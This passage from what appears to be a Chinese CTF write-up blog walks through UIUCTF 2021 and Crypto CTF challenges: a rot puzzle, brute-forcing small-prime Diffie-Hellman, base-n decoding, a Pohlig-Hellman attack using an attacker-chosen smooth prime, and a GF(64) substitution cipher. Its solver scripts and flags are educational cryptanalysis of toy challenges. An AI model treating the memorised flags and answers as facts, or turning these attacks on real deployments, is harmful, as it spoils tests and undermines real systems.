class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    <span class="keyword">return</span> f1(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># same as f1</span></span><br><span class="line">    <span class="keyword">return</span> f1(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outputImage</span>(<span class="params">path, pic, size</span>):</span></span><br><span class="line">    im = Image.new(<span class="string">&#x27;P&#x27;</span>, size,<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    pixels = im.load()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(im.size[<span class="number">1</span>]):</span><br><span class="line">            pixels[i, j] = (<span class="built_in">int</span>(pic[j][i]))</span><br><span class="line">    im.save(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptImage</span>(<span class="params">path, p0c0</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(in_img)</span><br><span class="line">    size = im.size</span><br><span class="line">    pic = np.array(im)</span><br><span class="line">    im.close()</span><br><span class="line">    r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">    r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">    r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">    w, h = size</span><br><span class="line">    const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">        r3 = f3(r3)</span><br><span class="line">    r1_list, r2_list = [], []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(w * h):</span><br><span class="line">        r1_list.append(r1)</span><br><span class="line">        r2_list.append(r2)</span><br><span class="line">        r1 = f1(r1)</span><br><span class="line">        r2 = f2(r2)</span><br><span class="line">    p0 = p0c0[<span class="number">0</span>]</span><br><span class="line">    c0 = p0c0[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            k = <span class="built_in">int</span>(<span class="built_in">round</span>(const * r3)) % <span class="number">256</span></span><br><span class="line">            k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            k = <span class="built_in">int</span>(k[p0 % <span class="number">8</span>:] + k[:p0 % <span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">            r3 = f3(r3)</span><br><span class="line">            pic[y, x] = ((pic[y, x] ^ c0 ^ k) - k) % <span class="number">256</span></span><br><span class="line">            c0 = k ^ ((k + pic[y, x]) % <span class="number">256</span>) ^ c0</span><br><span class="line">            p0 = pic[y, x]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r1_list.pop())) % w</span><br><span class="line">            y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r2_list.pop())) % h</span><br><span class="line">            pic[y, x], pic[y1, x1] = pic[y1, x1], pic[y, x]</span><br><span class="line">    outputImage(path, pic, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_img = <span class="string">&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">105</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>, <span class="number">205</span>):</span><br><span class="line">        decryptImage(<span class="built_in">str</span>(i)+<span class="string">&#x27;.bmp&#x27;</span>, (p, c))</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="UIUCTF-2021"><a href="#UIUCTF-2021" class="headerlink" title="UIUCTF 2021"></a>UIUCTF 2021</h2><h3 id="Re-hvhpgs-synt"><a href="#Re-hvhpgs-synt" class="headerlink" title="Re-hvhpgs{synt}"></a>Re-hvhpgs{synt}</h3><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210731121038121.png" alt="image-20210731121038121"></p>
<p>首先看到最显眼的两串字符，词频一下可以出来有含义的字符，然后发现是rot和位移，直接手撕了，输入<code>i_propose_to_consider_the_question_can_machines_think</code>就可以得到flag</p>
<h3 id="Crypto-dhke-intro"><a href="#Crypto-dhke-intro" class="headerlink" title="Crypto-dhke_intro"></a>Crypto-dhke_intro</h3><p>题目提示</p>
<blockquote>
<p>Small numbers are bad in cryptography. This is why.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate key</span></span><br><span class="line">gpList = [ [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">7</span>, <span class="number">17</span>], [<span class="number">3</span>, <span class="number">31</span>], [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">17</span>, <span class="number">23</span>], [<span class="number">2</span>, <span class="number">29</span>] ]</span><br><span class="line">g, p = random.choice(gpList)</span><br><span class="line">a = random.randint(<span class="number">1</span>, p)</span><br><span class="line">b = random.randint(<span class="number">1</span>, p)</span><br><span class="line">k = <span class="built_in">pow</span>(g, a * b, p)</span><br><span class="line">k = <span class="built_in">str</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;Diffie-Hellman key exchange outputs&quot;)</span></span><br><span class="line"><span class="comment"># print(&quot;Public key: &quot;, g, p)</span></span><br><span class="line"><span class="comment"># print(&quot;Jotaro sends: &quot;, aNum)</span></span><br><span class="line"><span class="comment"># print(&quot;Dio sends: &quot;, bNum)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pad key to 16 bytes (128bit)</span></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">padding = <span class="string">&quot;uiuctf2021uiuctf2021&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">16</span> - <span class="built_in">len</span>(key) != <span class="built_in">len</span>(k)):</span><br><span class="line">    key = key + padding[i]</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">key = key + k</span><br><span class="line">key = <span class="built_in">bytes</span>(key, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytes</span>(<span class="string">&quot;kono DIO daaaaaa&quot;</span>, encoding = <span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">ciphertext = cipher.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>看提示是要Diffie–Hellman密钥交换，但都可以爆破，注意下hex编码。抓住一名jo厨师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;b31699d587f7daf8f6b23b30cfee0edca5d6a3594cd53e1646b9e72de6fc44fe7ad40f0ea6&#x27;</span></span><br><span class="line">gpList = [[<span class="number">13</span>, <span class="number">19</span>], [<span class="number">7</span>, <span class="number">17</span>], [<span class="number">3</span>, <span class="number">31</span>], [<span class="number">13</span>, <span class="number">19</span>], [<span class="number">17</span>, <span class="number">23</span>], [<span class="number">2</span>, <span class="number">29</span>]]</span><br><span class="line">iv = <span class="built_in">bytes</span>(<span class="string">&quot;kono DIO daaaaaa&quot;</span>, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> g, p <span class="keyword">in</span> gpList:</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, p+<span class="number">1</span>):</span><br><span class="line">			k = <span class="built_in">str</span>(<span class="built_in">pow</span>(g, a * b, p))</span><br><span class="line">			key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">			i = <span class="number">0</span></span><br><span class="line">			padding = <span class="string">&#x27;uiuctf2021uiuctf2021&#x27;</span></span><br><span class="line">			<span class="keyword">while</span> <span class="number">16</span> - <span class="built_in">len</span>(key) != <span class="built_in">len</span>(k):</span><br><span class="line">				key = key + padding[i]</span><br><span class="line">				i += <span class="number">1</span></span><br><span class="line">			key = key + k</span><br><span class="line">			key = <span class="built_in">bytes</span>(key, encoding=<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">			cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">			flag = cipher.decrypt(unhexlify(ciphertext))</span><br><span class="line">			<span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;uiuctf&#x27;</span>):</span><br><span class="line">				<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-back-to-basics"><a href="#Crypto-back-to-basics" class="headerlink" title="Crypto-back_to_basics"></a>Crypto-back_to_basics</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, to_binary</span><br><span class="line"><span class="comment">#from secret import flag, key</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="built_in">bytearray</span>(<span class="string">b&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_encode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	<span class="keyword">return</span> mpz(bytes_to_long(bytes_in)).digits(base).upper().encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_decode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	bytes_out = to_binary(mpz(bytes_in, base=base))[:<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">return</span> bytes_out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">bytes_in, key</span>):</span></span><br><span class="line">	out = bytes_in</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		out = base_n_encode(out, ALPHABET.index(i))</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">bytes_in, key</span>):</span></span><br><span class="line">	out = bytes_in</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">		out = base_n_decode(out, ALPHABET.index(i))</span><br><span class="line">	<span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag_enc = encrypt(flag, key)</span></span><br><span class="line"><span class="string">f = open(&quot;flag_enc&quot;, &quot;wb&quot;)</span></span><br><span class="line"><span class="string">f.write(flag_enc)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>当然还有一个flag_enc文件，word太大了，你要忍一下~</p>
<p>挺有意思的题目，还是尚师傅点醒我的，就是2~36进制的转换，关键函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_n_decode</span>(<span class="params">bytes_in, base</span>):</span></span><br><span class="line">	bytes_out = long_to_bytes(<span class="built_in">int</span>(bytes_in, base=base))</span><br><span class="line">	<span class="keyword">return</span> bytes_out</span><br></pre></td></tr></table></figure>

<p>不得不说，python的int还是挺完善的</p>
<p>然后没有写一次性脚本了，手撕的，因为有些比如key的最后一位是W进制，但是U和V也没在密文里出现，脚本不够完善吧</p>
<h3 id="Crypto-dhke-adventure"><a href="#Crypto-dhke-adventure" class="headerlink" title="Crypto-dhke_adventure"></a>Crypto-dhke_adventure</h3><p>又是jo厨师傅出的题，很明显的离散对数系统的密码题，因为hint有smoother，可以想到是解离散对数的光滑数问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m too lazy to find parameters for my DHKE, choose for me.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter prime at least 1024 at most 2048 bits: &quot;</span>)</span><br><span class="line"><span class="comment"># get user&#x27;s choice of p</span></span><br><span class="line">p = <span class="built_in">input</span>()</span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line"><span class="comment"># check prime valid</span></span><br><span class="line"><span class="keyword">if</span> p.bit_length() &lt; <span class="number">1024</span> <span class="keyword">or</span> p.bit_length() &gt; <span class="number">2048</span> <span class="keyword">or</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">    exit(<span class="string">&quot;Invalid input.&quot;</span>)</span><br><span class="line"><span class="comment"># prepare for key exchange</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">a = randint(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">b = randint(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># generate key</span></span><br><span class="line">dio = <span class="built_in">pow</span>(g,a,p)</span><br><span class="line">jotaro = <span class="built_in">pow</span>(g,b,p)</span><br><span class="line">key = <span class="built_in">pow</span>(dio,b,p)</span><br><span class="line">key = sha256(<span class="built_in">str</span>(key).encode()).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;uiuctf2021uiuctf&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">ciphertext = cipher.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Dio sends: &quot;</span>, dio)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Jotaro sends: &quot;</span>, jotaro)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &quot;</span>, ciphertext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>已知</p>
<p>$dio=g^a\ mod\ p$</p>
<p>$jotaro=g^b\ mod\ p$</p>
<p>$key=dio^b\ mod\ p$</p>
<p>解题的关键是p可以由攻击者提供的，那直接提供一个光滑数+1好了，这样这个DLP离散对数求解的难题就变得可计算了，具体的推导参考pohlig-hellman攻击原理，有能力可以复现</p>
<p>一些小的点，这里直接上脚本了，首先生成一个光滑数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">item = <span class="number">2</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p *= item</span><br><span class="line">    item = next_prime(item)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1024</span> &lt; p.bit_length() &lt; <span class="number">2048</span> <span class="keyword">and</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(p+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>懒狗了，直接手动接收，然后在sgae里求a和b；这个之前网鼎杯青龙组的you raise me up演示过，最终的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">a = <span class="number">1706514538409217609380184471483970486111601581179909732547081795755601848099714892783660477820125268651686071436129197042742970850298506167342840465201954449860957095450958345421698689291401652404764413822088773220645950460091121901749681603487210460064157239812734204314334694247020508700704643391774792654182943517813353983667531492481271292815208332729128642069655591289999915464139472699283049217926350224615448461688066</span></span><br><span class="line">b = <span class="number">14466632275269913037069509287532932279884213206515600538938395240468925268146374104530207395909468350257778074856758057525057561502009116834555962090895520108072724285442706303410135968614985268443945781896987070215220814783356743958044861941110284092061774699164461968593879814604175818707171934938878476262296832165434644133455246857171139473183371584687955863862012348287764247314297996868855594079156695942227229848338865</span></span><br><span class="line">dio = <span class="number">16167922424137241666246302388507094614219683075656937696624976269971219170930381539629329712953190516880647147637220034502113432117052541565403357952291692484827614380683288824529855182911429985823152492290185107775580207164746921109360997835543504066225649925051809637197356760554700827177215351020335554912004088973554778245562345835228507025035376705826984822212122075068467338353809039042992813485576139824709322511611135</span></span><br><span class="line"><span class="keyword">assert</span> dio == <span class="built_in">pow</span>(g, a, p)</span><br><span class="line"><span class="keyword">assert</span> jotaro == <span class="built_in">pow</span>(g, b, p)</span><br><span class="line">key = <span class="built_in">pow</span>(dio, b, p)</span><br><span class="line">key = sha256(<span class="built_in">str</span>(key).encode()).digest()</span><br><span class="line">jo = <span class="number">8478318935358501390014596426908185869306605857407596116840606911586830527583698320042764633027826654399751539088096707226001027141331485792640154020208368663060333097725346477808040686885134694513306486060638308544451042554707764114958622916238232491752753035945375341164707378481832386716731243612254449779955395389475168461403985894687650228947467124029857674022920610930987210652487673276585269753595356252512713370074208</span></span><br><span class="line">ciphertext = <span class="string">&#x27;f21c554f4e520e3122eb9708bd88de356b7d0d8d9728536b39d22b706afcdaecd7bed753666a763f8c0d&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;uiuctf2021uiuctf&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">flag = cipher.decrypt(unhexlify(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>新配置的windows terminal真好看，还不会乱码，秀一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210805183255028.png" alt="image-20210805183255028"></p>
<h2 id="Crypto-CTF"><a href="#Crypto-CTF" class="headerlink" title="Crypto CTF"></a>Crypto CTF</h2><p>当时没来得及打就结束了，所以做出来的都会贴一下flag。谢谢主办方不关nc</p>
<p>签到就不说了</p>
<h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><h4 id="Farm"><a href="#Farm" class="headerlink" title="Farm"></a>Farm</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string, base64, math</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">ALPHABET = string.printable[:<span class="number">62</span>] + <span class="string">&#x27;\\=&#x27;</span></span><br><span class="line"></span><br><span class="line">F = <span class="built_in">list</span>(GF(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>(<span class="params">l</span>):</span></span><br><span class="line">	key = [F[randint(<span class="number">1</span>, <span class="number">63</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l)] </span><br><span class="line">	key = math.prod(key) <span class="comment"># Optimization the key length :D</span></span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maptofarm</span>(<span class="params">c</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> c <span class="keyword">in</span> ALPHABET</span><br><span class="line">	<span class="keyword">return</span> F[ALPHABET.index(c)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">	m64 = base64.b64encode(msg)</span><br><span class="line">	enc, pkey = <span class="string">&#x27;&#x27;</span>, key**<span class="number">5</span> + key**<span class="number">3</span> + key**<span class="number">2</span> + <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> m <span class="keyword">in</span> m64:</span><br><span class="line">		enc += ALPHABET[F.index(pkey * maptofarm(<span class="built_in">chr</span>(m)))]</span><br><span class="line">	<span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEEP IT SECRET </span></span><br><span class="line">key = keygen(<span class="number">14</span>) <span class="comment"># I think 64**14 &gt; 2**64 is not brute-forcible :P</span></span><br><span class="line"></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>本来看到是放弃的，套了好几层啊，还有GF不是有限域吗？怎么会出来多项式？？？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210812224123276.png" alt="image-20210812224123276"></p>
<p>但现在要复现，硬着头皮做了下，没想到第一次就出来了，就是类似字典key和value的关系，关键的key爆破下就好了。本来想画下流程图的，但也就是字母表到F，F到字母表等的一些位置和值的替换，不是很好体现，鉴于是简单题，就不画了。贴下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = <span class="string">&#x27;805c9GMYuD5RefTmabUNfS9N9YrkwbAbdZE0df91uCEytcoy9FDSbZ8Ay8jj&#x27;</span></span><br><span class="line">ALPHABET = string.printable[:<span class="number">62</span>] + <span class="string">&#x27;\\=&#x27;</span></span><br><span class="line"></span><br><span class="line">F = <span class="built_in">list</span>(GF(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pkey <span class="keyword">in</span> F:</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        p1 = ALPHABET.index(i)</span><br><span class="line">        p2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> pkey!= <span class="number">0</span>:</span><br><span class="line">            p2 = F.index(F[p1] / pkey)</span><br><span class="line">        c += ALPHABET[p2]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64decode(c))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>然后在64个结果中找flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210812224334985.png" alt="image-20210812224334985"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CCTF&#123;EnCrYp7I0n_4nD_5u8STitUtIn9_iN_Fi3Ld!&#125;</span><br></pre></td></tr></table></figure>

<h4 id="KeyBase（unsolved）"><a href="#KeyBase（unsolved）" class="headerlink" title="KeyBase（unsolved）"></a>KeyBase（unsolved）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os, sys, random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">	iv, key = [os.urandom(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line">	<span class="keyword">return</span> iv, key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, iv, key</span>):</span></span><br><span class="line">	aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> aes.encrypt(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">enc, iv, key</span>):</span></span><br><span class="line">	aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	<span class="keyword">return</span> aes.decrypt(enc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">die</span>(<span class="params">*args</span>):</span></span><br><span class="line">	pr(*args)</span><br><span class="line">	quit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">*args</span>):</span></span><br><span class="line">	s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">	sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sc</span>():</span></span><br><span class="line">	<span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	border = <span class="string">&quot;+&quot;</span></span><br><span class="line">	pr(border*<span class="number">72</span>)</span><br><span class="line">	pr(border, <span class="string">&quot; hi all, welcome to the simple KEYBASE cryptography task, try to    &quot;</span>, border)</span><br><span class="line">	pr(border, <span class="string">&quot; decrypt the encrypted message and get the flag as a nice prize!    &quot;</span>, border)</span><br><span class="line">	pr(border*<span class="number">72</span>)</span><br><span class="line"></span><br><span class="line">	iv, key = keygen()</span><br><span class="line">	flag_enc = encrypt(flag, iv, key).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		pr(<span class="string">&quot;| Options: \n|\t[G]et the encrypted flag \n|\t[T]est the encryption \n|\t[Q]uit&quot;</span>)</span><br><span class="line">		ans = sc().lower()</span><br><span class="line">		<span class="keyword">if</span> ans == <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">			pr(<span class="string">&quot;| encrypt(flag) =&quot;</span>, flag_enc)</span><br><span class="line">		<span class="keyword">elif</span> ans == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">			pr(<span class="string">&quot;| Please send your 32 bytes message to encrypt: &quot;</span>)</span><br><span class="line">			msg_inp = sc()</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(msg_inp) == <span class="number">32</span>:</span><br><span class="line">				enc = encrypt(msg_inp, iv, key).<span class="built_in">hex</span>()</span><br><span class="line">				r = random.randint(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">				s = <span class="number">4</span> - r</span><br><span class="line">				mask_key = 